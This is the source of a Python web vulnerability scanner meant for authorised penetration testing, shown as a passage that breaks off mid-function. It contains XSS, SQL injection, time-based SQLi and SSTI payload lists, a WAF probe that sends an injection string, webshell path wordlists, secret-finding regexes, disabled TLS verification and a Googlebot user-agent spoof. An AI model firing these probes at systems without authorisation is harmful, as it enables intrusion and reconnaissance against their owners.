#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#py:@YAALI_515
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          WebVulnScanner v1.0 — Professional Vulnerability Scanner           ║
║                     For authorised penetration testing only                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

FIXES IN v3.0:
  - RemoteDisconnected / HEAD-blocked servers: replaced HEAD probe with
    resilient GET+stream that works even when HEAD is rejected by WAFs/CDNs.
  - TLS 1.0/1.1 legacy servers: custom SSLContext with permissive ciphers.
  - Retry storms: exponential backoff, separate reachability logic.
  - Windows-safe: no UNIX-only calls, correct path separators.
  - All modules hardened with per-module try/except so one failure never
    kills the rest of the scan.

NEW IN v3.0:
  - Subdomain enumeration (DNS brute-force)
  - HTTP method tampering tests (PUT/DELETE/TRACE/OPTIONS)
  - CORS misconfiguration detection
  - Clickjacking PoC page generator
  - Sensitive data exposure in JS files (API keys, tokens, secrets)
  - robots.txt / sitemap.xml parser and analyser
  - WAF/CDN fingerprinting
  - HTTP Request Smuggling detection (basic CL.TE probe)
  - Server-Side Template Injection (SSTI) detection
  - XML External Entity (XXE) basic probe
  - HTTP Host Header injection
  - Timing-based blind SQLi detection
  - Full JSON / HTML / TXT report with severity-coloured HTML
  - Progress bar / live status line
  - --fast mode (skip slow checks)
  - --stealth mode (longer delays, single-thread)

DISCLAIMER: Only scan systems you own or have explicit written permission
            to test. Unauthorised scanning is illegal.
"""
#I MADE THIS TOOL FROM ZERO AND I FIXED WITH AI 

# ── stdlib ────────────────────────────────────────────────────────────────────
import os, re, sys, ssl, json, time, socket, shutil, queue, hashlib
import logging, argparse, datetime, ipaddress, subprocess, threading
import concurrent.futures
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Set
from urllib.parse import urlparse, urljoin, quote, urlencode, parse_qs
from http.client import RemoteDisconnected
import html as html_module

# ── optional third-party ──────────────────────────────────────────────────────
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

try:
    import nmap as python_nmap
    NMAP_LIB_OK = True
except ImportError:
    NMAP_LIB_OK = False

# ── logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.WARNING,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ══════════════════════════════════════════════════════════════════════════════
VERSION       = "3.0.0"
TIMEOUT       = 12          # per-request timeout (seconds)
FAST_TIMEOUT  = 5
DELAY         = 0.25        # polite delay between requests
STEALTH_DELAY = 2.0
THREADS       = 15
SEV_ORDER     = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}

# ── ANSI colours ──────────────────────────────────────────────────────────────
class C:
    R = "\033[0m"
    B = "\033[1m"
    RED    = "\033[91m"
    GRN    = "\033[92m"
    YLW    = "\033[93m"
    BLU    = "\033[94m"
    MAG    = "\033[95m"
    CYN    = "\033[96m"
    WHT    = "\033[97m"
    GRY    = "\033[90m"
    @staticmethod
    def sev(s):
        return {"Critical":"\033[91m\033[1m","High":"\033[91m",
                "Medium":"\033[93m","Low":"\033[96m","Info":"\033[90m"}.get(s,"\033[97m")

# Enable Windows ANSI
if sys.platform == "win32":
    os.system("")

# ── Browser-like headers ──────────────────────────────────────────────────────
BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,"
        "image/avif,image/webp,*/*;q=0.8"
    ),
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

# ── Common ports ──────────────────────────────────────────────────────────────
COMMON_PORTS = {
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",
    80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",
    993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",
    3000:"Dev-HTTP",3306:"MySQL",3389:"RDP",4443:"HTTPS-Alt",
    5432:"PostgreSQL",5900:"VNC",6379:"Redis",7001:"WebLogic",
    8000:"HTTP-Alt",8080:"HTTP-Alt",8443:"HTTPS-Alt",8888:"HTTP-Alt",
    9000:"PHP-FPM",9200:"Elasticsearch",27017:"MongoDB",
}

# ── Wordlists ─────────────────────────────────────────────────────────────────
DIR_WORDLIST = [
    # Admin / auth
    "admin","administrator","wp-admin","wp-login.php","login","logout",
    "dashboard","panel","cpanel","webmail","phpmyadmin","pma","adminer",
    "admin/login","admin/dashboard","user/login","auth/login",
    # Config / sensitive files
    ".env",".env.local",".env.production",".env.backup",
    ".git",".git/HEAD",".git/config",".svn",".svn/entries",
    ".htaccess",".htpasswd",".DS_Store",
    "config.php","config.yml","config.yaml","config.json","config.ini",
    "configuration.php","wp-config.php","settings.py","settings.php",
    "database.yml","db.php","db.sql","dump.sql","backup.sql",
    "web.config","applicationHost.config",
    # Backup files
    "backup","backups","bak","old","archive","temp","tmp",
    "backup.zip","backup.tar.gz","www.zip","site.zip","files.zip",
    "db_backup.sql","database_backup.sql",
    # Info disclosure
    "phpinfo.php","info.php","test.php","debug.php","status",
    "server-status","server-info","nginx_status","health","ping",
    "robots.txt","sitemap.xml","sitemap_index.xml","crossdomain.xml",
    ".well-known/security.txt",".well-known/assetlinks.json",
    "readme.txt","README.md","CHANGELOG","LICENSE","INSTALL",
    "composer.json","package.json","yarn.lock","Gemfile",
    # CMS
    "xmlrpc.php","wp-cron.php","wp-json","wp-json/wp/v2/users",
    "wp-content/debug.log","wp-content/uploads",
    "administrator","components","modules","templates","joomla.xml",
    "sites/default","sites/default/settings.php","CHANGELOG.txt",
    # APIs
    "api","api/v1","api/v2","api/v3","graphql","swagger",
    "swagger-ui.html","api-docs","openapi.json","redoc",
    "v1","v2","v3","rest","soap","wsdl",
    # Shell / webshells
    "shell.php","cmd.php","webshell.php","c99.php","r57.php",
    "b374k.php","WSO.php","upload.php","uploader.php",
    # Log files
    "error_log","access_log","error.log","access.log","debug.log",
    "app.log","application.log","laravel.log","php_errors.log",
    # Misc
    "cgi-bin","cgi-bin/test.cgi","cgi-bin/printenv",
    "include","includes","inc","lib","library","vendor","node_modules",
    "static","assets","uploads","files","images","media","css","js",
    "_profiler","_wdt","telescope","horizon","adminer.php",
]

SUBDOMAINS = [
    "www","mail","webmail","smtp","pop","imap","ftp","sftp",
    "dev","development","staging","test","qa","uat","demo",
    "admin","administrator","portal","dashboard","control","panel",
    "api","api2","rest","graphql","service","services",
    "cdn","static","assets","media","images","files","downloads",
    "blog","shop","store","pay","payment","checkout","cart",
    "support","help","ticket","status","monitor",
    "vpn","remote","gateway","proxy","firewall",
    "db","database","mysql","postgres","redis","mongo","elastic",
    "git","svn","jenkins","ci","build","deploy","gitlab","bitbucket",
    "ns1","ns2","mx","mx1","mx2","email","newsletter",
    "app","mobile","beta","alpha","preview","sandbox",
    "internal","intranet","corp","office","staff","employee",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '<body onload=alert(1)>',
    '{{7*7}}',   # SSTI detection too
    '${7*7}',
]

SQLI_PAYLOADS = [
    "'",'"',"'`","\\","1'",
    "' OR '1'='1","' OR 1=1--","' OR 1=1#",
    '" OR "1"="1','" OR 1=1--',
    "') OR ('1'='1","1) OR (1=1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(0)--",
]

SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(3)--",          3.0, "MySQL SLEEP"),
    ("'; WAITFOR DELAY '0:0:3'--",3.0, "MSSQL WAITFOR"),
    ("' AND pg_sleep(3)--",       3.0, "PostgreSQL pg_sleep"),
    ("' OR SLEEP(3)#",            3.0, "MySQL SLEEP (#)"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax","warning: mysql",
    "unclosed quotation mark","quoted string not properly terminated",
    "pg_query()","pg_exec()","supplied argument is not a valid",
    "ora-01756","ora-00933","ora-00907","microsoft ole db",
    "odbc microsoft access driver","microsoft jet database",
    "[microsoft][odbc sql server driver]",
    "sqlite_master","sqlite3.operationalerror",
    "sqlstate","sql syntax","syntax error",
    "mysql_fetch","mysql_num_rows","mysql_result",
    "division by zero","invalid query","db error",
    "syntax error or access violation",
]

SSTI_PAYLOADS = [
    ("{{7*7}}",    "49",  "Jinja2/Twig"),
    ("${7*7}",     "49",  "Freemarker/EL"),
    ("#{7*7}",     "49",  "Thymeleaf"),
    ("<%= 7*7 %>", "49",  "ERB/JSP"),
    ("*{7*7}",     "49",  "Spring"),
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "sev":"Medium","fix":"Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        "desc":"HSTS forces HTTPS connections and prevents SSL stripping.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"
    },
    "Content-Security-Policy": {
        "sev":"High","fix":"Content-Security-Policy: default-src 'self'",
        "desc":"CSP prevents XSS and data injection attacks by restricting resource origins.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
    },
    "X-Frame-Options": {
        "sev":"Medium","fix":"X-Frame-Options: DENY",
        "desc":"Prevents clickjacking attacks by blocking iframe embedding.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"
    },
    "X-Content-Type-Options": {
        "sev":"Low","fix":"X-Content-Type-Options: nosniff",
        "desc":"Prevents MIME-type sniffing which can lead to XSS.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
    },
    "Referrer-Policy": {
        "sev":"Low","fix":"Referrer-Policy: strict-origin-when-cross-origin",
        "desc":"Controls referrer information sent with requests.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"
    },
    "Permissions-Policy": {
        "sev":"Low","fix":"Permissions-Policy: camera=(), microphone=(), geolocation=()",
        "desc":"Restricts browser features and APIs available to the page.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
    },
    "Cross-Origin-Opener-Policy": {
        "sev":"Low","fix":"Cross-Origin-Opener-Policy: same-origin",
        "desc":"Protects against cross-origin window interactions.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy"
    },
    "Cross-Origin-Resource-Policy": {
        "sev":"Low","fix":"Cross-Origin-Resource-Policy: same-origin",
        "desc":"Restricts which sites can embed this site's resources.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy"
    },
}

CMS_SIGS = {
    "WordPress":  {"body":["wp-content","wp-includes","WordPress"],"paths":["/wp-login.php","/wp-admin/"]},
    "Joomla":     {"body":["Joomla!","/components/com_"],"paths":["/administrator/"]},
    "Drupal":     {"body":["Drupal.settings","drupal.org","sites/default"],"paths":["/sites/default/"]},
    "Magento":    {"body":["Mage.Cookies","varien/js.js","mage/"],"paths":["/skin/frontend/"]},
    "Shopify":    {"body":["cdn.shopify.com","Shopify.theme"],"paths":[]},
    "PrestaShop": {"body":["prestashop","addons.prestashop.com"],"paths":["/modules/"]},
    "OpenCart":   {"body":["catalog/view/theme","route=common/home"],"paths":["/admin/"]},
    "TYPO3":      {"body":["typo3/","TYPO3"],"paths":["/typo3/"]},
    "Django":     {"body":["csrfmiddlewaretoken","__admin_media_prefix__"],"paths":["/admin/"]},
    "Laravel":    {"body":["laravel_session","XSRF-TOKEN","laravel"],"paths":[]},
    "Rails":      {"body":["authenticity_token","rails","action_dispatch"],"paths":[]},
    "ASP.NET":    {"body":["__VIEWSTATE","__EVENTVALIDATION","asp.net"],"paths":[]},
    "Spring":     {"body":["spring","org.springframework","Whitelabel Error"],"paths":[]},
}

WAF_SIGS = {
    "Cloudflare":  ["cf-ray","cloudflare","__cfduid","cf-cache-status"],
    "AWS WAF":     ["x-amzn-requestid","x-amz-cf-id","awselb"],
    "Akamai":      ["akamai","x-akamai-transformed","x-check-cacheable"],
    "Sucuri":      ["x-sucuri-id","x-sucuri-cache","sucuri"],
    "Imperva":     ["x-iinfo","incap_ses","visid_incap"],
    "F5 BIG-IP":   ["bigipserver","f5-trafficshield","ts="],
    "ModSecurity": ["mod_security","modsecurity","NOYB"],
    "Wordfence":   ["wordfence","wfvt_"],
    "Barracuda":   ["barra_counter_session"],
    "Reblaze":     ["x-reblaze-protection"],
}

JS_SECRET_PATTERNS = [
    (r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']([A-Za-z0-9\-_]{16,})["\']',          "API Key"),
    (r'(?i)(secret[_-]?key|secret)\s*[:=]\s*["\']([A-Za-z0-9\-_/+=]{16,})["\']',    "Secret Key"),
    (r'(?i)(access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']([A-Za-z0-9\-_.]{16,})["\']',"Access Token"),
    (r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']([^"\']{6,})["\']',                   "Hardcoded Password"),
    (r'(?i)(aws_access_key_id|aws_secret)\s*[:=]\s*["\']([A-Z0-9]{16,})["\']',       "AWS Key"),
    (r'AKIA[0-9A-Z]{16}',                                                              "AWS Access Key ID"),
    (r'(?i)(private[_-]?key)\s*[:=]\s*["\']([A-Za-z0-9\-_]{16,})["\']',             "Private Key"),
    (r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+',                    "JWT Token"),
    (r'(?i)(bearer\s+)([A-Za-z0-9\-_.~+/]{20,})',                                    "Bearer Token"),
    (r'(?i)(github[_-]?token|gh_token)\s*[:=]\s*["\']([A-Za-z0-9_]{35,45})["\']',   "GitHub Token"),
    (r'(?i)(stripe[_-]?key|stripe_secret)\s*[:=]\s*["\']([A-Za-z0-9_]{20,})["\']',  "Stripe Key"),
    (r'(?i)google[_-]?api[_-]?key\s*[:=]\s*["\']([A-Za-z0-9\-_]{35,45})["\']',     "Google API Key"),
    (r'(?i)(twilio[_-]?(account[_-]?sid|auth[_-]?token))\s*[:=]\s*["\']([A-Z0-9a-z]{32,})["\']', "Twilio Key"),
    (r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----',                                "PEM Private Key"),
]

# ══════════════════════════════════════════════════════════════════════════════
# DATA MODELS
# ══════════════════════════════════════════════════════════════════════════════

class Vuln:
    def __init__(self, name, severity, desc, component="", evidence="",
                 fix="", refs=None, cves=None):
        self.name      = name
        self.severity  = severity
        self.desc      = desc
        self.component = component
        self.evidence  = evidence[:500] if evidence else ""
        self.fix       = fix
        self.refs      = refs or []
        self.cves      = cves or []
        self.ts        = datetime.datetime.utcnow().isoformat() + "Z"

    def to_dict(self):
        return {k: getattr(self, k) for k in
                ("name","severity","desc","component","evidence","fix","refs","cves","ts")}


class Report:
    def __init__(self, url, ip):
        self.url    = url
        self.ip     = ip
        self.start  = datetime.datetime.utcnow()
        self.end    = None
        self.vulns: List[Vuln] = []
        self.ports:  List[Dict] = []
        self.info:   Dict[str,Any] = {}
        self.cms     = None
        self.waf     = None
        self.errors: List[str] = []
        self.subdomains: List[str] = []
        self._lock   = threading.Lock()

    def add(self, v: Vuln):
        with self._lock:
            self.vulns.append(v)

    def err(self, msg: str):
        with self._lock:
            self.errors.append(msg)

    def done(self):
        self.end = datetime.datetime.utcnow()

    def duration(self):
        if self.end:
            return f"{(self.end - self.start).total_seconds():.1f}s"
        return "N/A"

    def stats(self):
        s = {"Critical":0,"High":0,"Medium":0,"Low":0,"Info":0}
        for v in self.vulns:
            s[v.severity] = s.get(v.severity,0)+1
        return s

    def sorted_vulns(self):
        return sorted(self.vulns, key=lambda v: SEV_ORDER.get(v.severity,99))


# ══════════════════════════════════════════════════════════════════════════════
# RESILIENT HTTP SESSION  ← KEY FIX
# ══════════════════════════════════════════════════════════════════════════════

class Session:
    """
    Fixed session that handles:
    - Servers that reject HEAD → uses GET+stream
    - TLS 1.0/1.1 legacy servers → permissive SSL context
    - RemoteDisconnected → retries with http fallback
    - Connection aborted → raw TCP probe fallback
    - WAFs that block python-requests UA → rotates UAs
    """

    ALT_UAS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
    ]

    def __init__(self, delay=DELAY):
        if not REQUESTS_OK:
            raise RuntimeError("pip install requests")
        self.delay   = delay
        self._ua_idx = 0
        self._sess   = self._make_session()

    def _make_session(self) -> "requests.Session":
        s = requests.Session()
        s.headers.update(BROWSER_HEADERS)
        s.max_redirects = 10
        # Permissive retry — but NO automatic retry on connection errors
        # (we want to handle those ourselves)
        retry = Retry(total=1, backoff_factor=0.3,
                      status_forcelist=[500,502,503,504],
                      allowed_methods=["GET","POST","OPTIONS"])
        # Build a permissive TLS adapter
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            # Allow legacy TLS
            ctx.options &= ~ssl.OP_NO_SSLv3
            ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
        except Exception:
            ctx = None

        class TLSAdapter(HTTPAdapter):
            def __init__(self, ssl_context=None, **kw):
                self.ssl_ctx = ssl_context
                super().__init__(max_retries=retry, **kw)
            def init_poolmanager(self, *a, **kw):
                if self.ssl_ctx:
                    kw["ssl_context"] = self.ssl_ctx
                super().init_poolmanager(*a, **kw)

        adp = TLSAdapter(ssl_context=ctx)
        s.mount("https://", adp)
        s.mount("http://",  HTTPAdapter(max_retries=retry))
        return s

    def _rotate_ua(self):
        self._ua_idx = (self._ua_idx + 1) % len(self.ALT_UAS)
        self._sess.headers["User-Agent"] = self.ALT_UAS[self._ua_idx]

    def get(self, url: str, **kw) -> Optional["requests.Response"]:
        """GET with comprehensive error handling and automatic http fallback."""
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("verify",  False)
        kw.setdefault("allow_redirects", True)
        kw.setdefault("stream", False)

        # Small polite delay
        if self.delay > 0:
            time.sleep(self.delay)

        attempts = [url]
        # If https fails, also try http
        if url.startswith("https://"):
            attempts.append("http://" + url[8:])

        last_err = None
        for attempt_url in attempts:
            for ua_try in range(2):   # try current UA, then rotate
                try:
                    r = self._sess.get(attempt_url, **kw)
                    return r
                except (RemoteDisconnected,
                        requests.exceptions.ConnectionError) as e:
                    last_err = e
                    # RemoteDisconnected often means the server closed on us
                    # Try without keep-alive
                    self._sess.headers["Connection"] = "close"
                    try:
                        r = self._sess.get(attempt_url, **kw)
                        self._sess.headers["Connection"] = "keep-alive"
                        return r
                    except Exception:
                        pass
                    self._sess.headers["Connection"] = "keep-alive"
                    if ua_try == 0:
                        self._rotate_ua()
                except requests.exceptions.SSLError as e:
                    last_err = e
                    # Already permissive, try http
                    break
                except requests.exceptions.Timeout as e:
                    last_err = e
                    return None
                except Exception as e:
                    last_err = e
                    if ua_try == 0:
                        self._rotate_ua()

        log.debug(f"GET {url} failed after all attempts: {last_err}")
        return None

    def post(self, url: str, **kw) -> Optional["requests.Response"]:
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("verify",  False)
        if self.delay > 0:
            time.sleep(self.delay)
        try:
            return self._sess.post(url, **kw)
        except Exception as e:
            log.debug(f"POST {url}: {e}")
            return None

    def options(self, url: str, **kw) -> Optional["requests.Response"]:
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("verify",  False)
        if self.delay > 0:
            time.sleep(self.delay)
        try:
            return self._sess.options(url, **kw)
        except Exception as e:
            log.debug(f"OPTIONS {url}: {e}")
            return None

    def raw_request(self, url: str, method: str, **kw) -> Optional["requests.Response"]:
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("verify",  False)
        if self.delay > 0:
            time.sleep(self.delay)
        try:
            return self._sess.request(method, url, **kw)
        except Exception as e:
            log.debug(f"{method} {url}: {e}")
            return None


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: RESOLVER  ← FIXED
# ══════════════════════════════════════════════════════════════════════════════

class Resolver:
    @staticmethod
    def normalise(url: str) -> str:
        url = url.strip()
        if not url.startswith(("http://","https://")):
            url = "https://" + url
        p = urlparse(url)
        if not p.netloc:
            raise ValueError(f"No hostname in: {url}")
        return url.rstrip("/")

    @staticmethod
    def resolve_ip(url: str) -> str:
        host = urlparse(url).hostname or ""
        return socket.gethostbyname(host)

    @staticmethod
    def check_reachable(url: str) -> Tuple[bool, str]:
        """
        FIX: uses GET+stream (not HEAD) to handle servers that block HEAD.
        Falls back through: https GET → http GET → raw TCP 443 → raw TCP 80.
        """
        parsed = urlparse(url)
        host   = parsed.hostname or ""
        headers = dict(BROWSER_HEADERS)

        # Attempt 1 — HTTPS GET stream
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            try: ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
            except Exception: pass
            r = requests.get(
                url, timeout=15, verify=False, stream=True,
                headers=headers, allow_redirects=True,
            )
            r.close()
            return True, f"HTTP {r.status_code}"
        except requests.exceptions.SSLError as e:
            pass
        except RemoteDisconnected:
            # Server closed immediately — try without keep-alive
            try:
                headers2 = dict(headers); headers2["Connection"] = "close"
                r = requests.get(url, timeout=15, verify=False, stream=True,
                                 headers=headers2, allow_redirects=True)
                r.close()
                return True, f"HTTP {r.status_code} (no-keepalive)"
            except Exception:
                pass
        except requests.exceptions.ConnectionError as e:
            # Could be DNS failure — propagate that explicitly
            if "NameResolutionError" in str(e) or "Failed to resolve" in str(e):
                return False, f"DNS resolution failed: {e}"
        except Exception:
            pass

        # Attempt 2 — plain HTTP
        http_url = "http://" + url.split("//",1)[-1]
        try:
            r = requests.get(http_url, timeout=10, stream=True,
                             headers=headers, allow_redirects=True)
            r.close()
            return True, f"HTTP {r.status_code} (plain HTTP)"
        except Exception:
            pass

        # Attempt 3 — raw TCP
        for port in (443, 80, 8443, 8080):
            try:
                with socket.create_connection((host, port), timeout=5):
                    return True, f"TCP port {port} open (HTTP probe blocked)"
            except Exception:
                pass

        return False, "All connection attempts failed"


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: PORT SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class PortScanner:
    def __init__(self, host, report: Report, fast=False):
        self.host   = host
        self.report = report
        self.fast   = fast

    def _tcp_scan(self, ports) -> List[Dict]:
        results = []
        def probe(p):
            try:
                with socket.create_connection((self.host, p), timeout=1.5 if not self.fast else 0.7):
                    return {"port":p,"proto":"tcp","service":COMMON_PORTS.get(p,"unknown"),"version":"","state":"open"}
            except Exception:
                return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            for r in ex.map(probe, ports):
                if r: results.append(r)
        return sorted(results, key=lambda x: x["port"])

    def scan(self) -> List[Dict]:
        _status("Port scanning")
        ports = list(COMMON_PORTS.keys())

        nmap_bin = shutil.which("nmap")
        if NMAP_LIB_OK and nmap_bin:
            try:
                nm = python_nmap.PortScanner()
                args = "-sV --top-ports 1000 -T4 --open" if not self.fast else "-sV --top-ports 200 -T5 --open"
                nm.scan(self.host, arguments=args)
                results = []
                if self.host in nm.all_hosts():
                    for proto in nm[self.host].all_protocols():
                        for port, d in nm[self.host][proto].items():
                            if d["state"] == "open":
                                results.append({
                                    "port":port,"proto":proto,
                                    "service":d.get("name","unknown"),
                                    "version":d.get("version",""),"state":"open"
                                })
                self.report.ports = results
                _flag_dangerous_ports(results, self.report)
                return results
            except Exception as e:
                self.report.err(f"nmap error: {e}")

        results = self._tcp_scan(ports)
        self.report.ports = results
        _flag_dangerous_ports(results, self.report)
        return results


def _flag_dangerous_ports(ports, report: Report):
    dangerous = {21:"FTP (clear-text)",23:"Telnet (clear-text)",
                 3389:"RDP",445:"SMB",5900:"VNC",6379:"Redis (unauth)",
                 27017:"MongoDB (unauth)",9200:"Elasticsearch (unauth)"}
    for p in ports:
        if p["port"] in dangerous:
            report.add(Vuln(
                name=f"Dangerous service exposed: {dangerous[p['port']]} (:{p['port']})",
                severity="High",
                desc=f"Port {p['port']} ({dangerous[p['port']]}) is publicly reachable. "
                     "These services are common targets for brute-force and exploitation.",
                component=f"{report.ip}:{p['port']}",
                fix="Restrict with firewall rules. Disable if not required. Use VPN for admin access.",
                refs=["https://owasp.org/www-community/attacks/"]
            ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: WAF / CDN FINGERPRINTING
# ══════════════════════════════════════════════════════════════════════════════

class WAFDetector:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def detect(self) -> Optional[str]:
        _status("WAF/CDN fingerprinting")
        r = self.sess.get(self.url)
        if not r:
            return None
        h_lower = {k.lower():v.lower() for k,v in r.headers.items()}
        all_headers = " ".join(h_lower.keys()) + " " + " ".join(h_lower.values())
        cookies_str = " ".join(c.name.lower() for c in r.cookies)
        haystack = all_headers + " " + cookies_str

        for waf_name, sigs in WAF_SIGS.items():
            if any(s in haystack for s in sigs):
                self.report.waf = waf_name
                self.report.info["waf"] = waf_name
                self.report.add(Vuln(
                    name=f"WAF/CDN detected: {waf_name}",
                    severity="Info",
                    desc=f"A {waf_name} WAF/CDN was identified. Some vulnerabilities "
                         "may be mitigated but the underlying app could still be vulnerable.",
                    component=self.url,
                    fix="WAFs are not a substitute for secure coding practices.",
                ))
                return waf_name

        # Try sending a clearly malicious payload — WAF should block it
        test_url = self.url + "/?id=1'+OR+'1'='1&q=<script>alert(1)</script>"
        r2 = self.sess.get(test_url, allow_redirects=False)
        if r2 and r2.status_code in (403, 406, 429, 503):
            self.report.info["waf"] = "Unknown WAF (blocked malicious probe)"
            self.report.add(Vuln(
                name="WAF/IDS detected (blocked malicious probe)",
                severity="Info",
                desc=f"A security device (WAF/IDS) blocked a test payload (HTTP {r2.status_code}).",
                component=self.url,
                fix="WAFs are not a substitute for secure coding practices.",
            ))
        return None


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: WEB FINGERPRINTING
# ══════════════════════════════════════════════════════════════════════════════

class Fingerprinter:
    def __init__(self, url, sess: Session, report: Report):
        self.url    = url
        self.sess   = sess
        self.report = report

    def run(self) -> Dict:
        _status("Web server fingerprinting")
        info = {}
        r = self.sess.get(self.url)
        if not r:
            return info

        h = {k.lower(): v for k, v in r.headers.items()}
        if "server" in h:
            info["server"] = h["server"]
            if re.search(r"[/\s]\d+\.\d+", h["server"]):
                self.report.add(Vuln(
                    name="Server version disclosure (Server header)",
                    severity="Low",
                    desc=f"Server header reveals: '{h['server']}'. Aids fingerprinting for CVE targeting.",
                    component=self.url, evidence=f"Server: {h['server']}",
                    fix="Set generic server token (e.g. 'Server: nginx' without version).",
                    refs=["https://owasp.org/www-project-web-security-testing-guide/"]
                ))
        if "x-powered-by" in h:
            info["powered_by"] = h["x-powered-by"]
            self.report.add(Vuln(
                name="Technology disclosure (X-Powered-By header)",
                severity="Info",
                desc=f"X-Powered-By: {h['x-powered-by']} reveals backend technology.",
                component=self.url, evidence=f"X-Powered-By: {h['x-powered-by']}",
                fix="Remove X-Powered-By header in framework / server configuration.",
            ))
        if "x-aspnet-version" in h:
            info["aspnet"] = h["x-aspnet-version"]
            self.report.add(Vuln(
                name="ASP.NET version disclosure",
                severity="Low",
                desc=f"X-Aspnet-Version: {h['x-aspnet-version']}",
                component=self.url, evidence=f"X-Aspnet-Version: {h['x-aspnet-version']}",
                fix="Set <httpRuntime enableVersionHeader='false'/> in Web.config.",
            ))

        # Cookie technology hints
        cookies_raw = h.get("set-cookie","").lower()
        if   "phpsessid"          in cookies_raw: info["lang"] = "PHP"
        elif "jsessionid"         in cookies_raw: info["lang"] = "Java"
        elif "asp.net_sessionid"  in cookies_raw: info["lang"] = "ASP.NET"
        elif "rack.session"       in cookies_raw: info["lang"] = "Ruby"
        elif "laravel_session"    in cookies_raw: info["lang"] = "PHP/Laravel"
        elif "django_session"     in cookies_raw: info["lang"] = "Python/Django"

        # Meta generator
        if BS4_OK and r.text:
            soup = BeautifulSoup(r.text, "html.parser")
            gen  = soup.find("meta", attrs={"name": re.compile("generator",re.I)})
            if gen and gen.get("content"):
                info["generator"] = gen["content"]
            # JS frameworks
            scripts = [s.get("src","") for s in soup.find_all("script", src=True)]
            fws = []
            for src in scripts:
                s = src.lower()
                for kw, name in [("jquery","jQuery"),("react","React"),("angular","Angular"),
                                  ("vue","Vue.js"),("svelte","Svelte"),("backbone","Backbone.js"),
                                  ("ember","Ember.js"),("next","Next.js"),("nuxt","Nuxt.js")]:
                    if kw in s and name not in fws:
                        fws.append(name)
            if fws:
                info["js_frameworks"] = fws

        # WhatWeb integration
        if shutil.which("whatweb"):
            try:
                out = subprocess.run(
                    ["whatweb","--no-errors","-q",self.url],
                    capture_output=True, text=True, timeout=30
                ).stdout.strip()
                if out:
